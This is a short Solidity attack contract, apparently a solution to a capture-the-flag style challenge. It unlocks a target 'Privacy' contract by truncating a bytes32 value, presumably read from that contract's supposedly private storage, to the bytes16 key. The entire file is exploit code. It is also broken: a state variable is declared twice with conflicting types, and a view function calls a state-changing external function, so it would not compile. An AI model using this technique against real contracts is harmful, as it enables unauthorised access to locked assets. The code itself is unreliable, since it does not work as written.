pragma solidity ^0.6.0;

interface Privacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyAttack {
    address internal privacyContract;
    Privacy internal privacyContract;

    constructor(address _contract) public {
        privacyContract = Privacy(_contract);
    }

    function convert(bytes32 _bytes) internal view returns (bytes16) {
        return bytes16(_bytes);
    }

    function unlockContract(bytes32 _bytes) public view {
        privacyContract.unlock(convert(_bytes));
    }
}
